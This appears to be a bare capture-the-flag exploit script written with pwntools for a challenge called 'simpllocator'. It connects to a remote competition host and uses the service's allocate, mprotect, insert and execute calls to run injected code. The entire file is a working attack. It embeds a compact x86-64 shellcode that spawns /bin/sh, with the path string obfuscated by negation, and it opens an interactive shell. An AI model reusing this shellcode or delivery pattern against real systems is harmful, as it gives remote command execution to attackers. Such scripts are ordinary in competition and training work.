from pwn import *
import json
import base64
#io = process(["python3","simpllocator.py"],aslr=False)
io = remote(b"hto2024-finals-nlb-9fcbd7ce07567668.elb.ap-northeast-2.amazonaws.com",17935)

def alloc():
    a = {"callNum": 1, "args": None}
    io.sendline(json.dumps(a))

def insert(idx,payload):
    a = {
            "callNum": 2,
            "args": [
                { "type": "INT", "data": idx },
                { "type": "PTR", "data": base64.b64encode(payload).decode()} 
                    ]
        }
    io.sendline(json.dumps(a))

def mprotect(idx,permission):
    a = {
            "callNum": 4,
            "args": [
                { "type": "INT", "data": idx },
                { "type": "INT", "data": permission} 
                    ]
        }
    io.sendline(json.dumps(a))

def execute(idx):
    a = {
            "callNum": 5,
            "args": [
                { "type": "INT", "data": idx },
                    ]
        }
    io.sendline(json.dumps(a))

sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

alloc()
mprotect(0,2)
insert(0,sc)
#gdb.attach(io)
#pause()
execute(0)
io.interactive()
